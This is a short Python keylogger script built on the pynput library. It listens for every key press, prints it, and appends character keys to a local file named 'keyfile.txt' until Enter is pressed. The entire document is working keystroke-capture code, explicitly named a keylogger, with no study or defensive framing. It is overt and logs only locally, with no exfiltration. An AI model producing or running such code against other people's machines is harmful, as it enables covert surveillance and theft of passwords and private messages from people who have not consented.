from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except Exception as e:
            print(f"Error getting char: {e}")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed) 
    listener.start()
    try:
        input("Press Enter to stop the keylogger...")
    except KeyboardInterrupt:
        pass
    finally:
        listener.stop()
        listener.join()
